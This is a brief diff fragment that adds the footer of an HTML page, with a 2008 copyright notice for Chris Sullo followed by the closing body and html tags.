+<p class="copyright">&copy; 2008 Chris Sullo</p>
+
+<!-- (c) 2008 Chris Sullo -->
+
+</body>
+</html>
+
